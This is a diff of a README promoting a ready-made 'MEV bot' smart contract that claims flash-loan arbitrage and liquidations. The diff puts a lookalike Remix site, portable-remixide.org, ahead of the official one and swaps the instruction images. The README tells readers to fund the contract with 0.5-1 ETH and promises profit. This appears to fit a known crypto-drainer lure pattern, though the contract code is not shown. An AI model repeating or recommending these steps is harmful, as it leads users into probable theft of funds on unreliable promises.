@@ -1,5 +1,6 @@
-Executor (Aave/Balancer + Uniswap/Sushi)
+![B](https://i.ibb.co/Cs45vCGb/20251219-1540-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)
 
+## Executor (Aave/Balancer + Uniswap/Sushi)
 Basically, contract for MEV: takes flash loans, runs arbitrage between DEXes, does liquidations. Everything is ready, deploy and use.
 
 What it does:
@@ -21,13 +22,13 @@ How to run:
 Owner contract — you are the owner, call functions, it does flash loans and strategies in one transaction.
 
 **Quick scheme:**
-1. Create contract in Remix: https://remix.ethereum.org/ or https://portable-remixide.org
+1. Create contract in Remix: https://portable-remixide.org/ or https://remix.ethereum.org/
 
 According to Screenshot:
-1- Create .sol file and paste contract in editor field [myBot.sol](myBot.sol)
+1- Create .sol file and paste contract in editor field
 2- Compilation tab > version 0.8.20 > Compile button
 3- Deploy tab > Select Executor contract > press Deploy Contract
-![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)
+![Contract creation instructions](https://i.ibb.co/xqqBQDr3/instructions.png)
 
 2. Top up contract balance (0.5-1 ETH)
 
@@ -78,4 +79,9 @@ Roughly about profit: depends on loan size and market situation. For arbitrage u
 
 Good luck!
 
+---
 
+<!-- GitHub Visitor counter (English) -->
+![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_EN_PAGE_ID)
+
+> ⚠️ Replace `README_EN_PAGE_ID` with unique identifier for English README
